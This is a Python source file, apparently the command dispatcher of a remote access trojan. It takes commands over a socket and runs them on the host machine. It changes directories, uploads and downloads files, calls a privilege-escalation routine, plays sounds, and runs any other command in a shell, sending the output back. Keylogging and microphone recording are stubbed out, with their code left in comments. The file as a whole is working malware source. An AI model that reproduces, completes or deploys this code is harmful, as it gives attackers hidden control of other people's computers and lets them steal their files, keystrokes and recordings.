import os
import subprocess
from remote_shell.network import reliable_send

from modules.keylogger import Keylogger
from modules.priv_escalation import escalate_privilege
from modules.mic_recorder import MicRecorder
from modules.sound_player import SoundPlayer


def handle_command(sock, command: str) -> bool:
    if command == 'quit':
        return False
    elif command == 'clear':
        os.system('clear')
        return True
    elif command.startswith('cd '):
        path = command[3:].strip()
        try:
            os.chdir(path)
            reliable_send(sock, f"[+] Changed dir to {os.getcwd()}")
        except Exception as e:
            reliable_send(sock, f"[!] {e}")
    elif command.startswith('download '):
        from remote_shell.file_transfer import upload
        file_name = command.split(' ', 1)[1]
        upload(sock, file_name)
    elif command.startswith('upload '):
        from remote_shell.file_transfer import download
        file_name = command.split(' ', 1)[1]
        download(sock, file_name)
    elif command == 'keylogger_start':
        reliable_send(sock, "[!] Keylogger: feature under development\n")
    elif command == 'keylogger_stop':
        reliable_send(sock, "[!] Keylogger: feature under development\n")
        
        """
    elif command == 'keylogger_start':
        Keylogger.start()
        reliable_send(sock, "[+] Keylogger started")
    elif command == 'keylogger_stop':
        logs = Keylogger.stop()
        reliable_send(sock, logs)
        """
        
    elif command == 'priv_escalate':
        res = escalate_privilege()
        reliable_send(sock, res)
    elif command.startswith('record_mic '):
        reliable_send(sock, "[!] Mic recorder: feature under development\n")
        
        """
    elif command.startswith('record_mic '):
        duration = float(command.split(' ', 1)[1])
        recorder = MicRecorder()
        recorder.record(duration)
        recorder.save('mic_record.wav')
        reliable_send(sock, "[+] Mic recording saved as mic_record.wav")
        """
        
    elif command.startswith('play_sound '):
        path = command.split(' ', 1)[1]
        player = SoundPlayer()
        player.play(path)
        reliable_send(sock, f"[+] Played {path}")
    else:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        reliable_send(sock, output.decode())
    return True
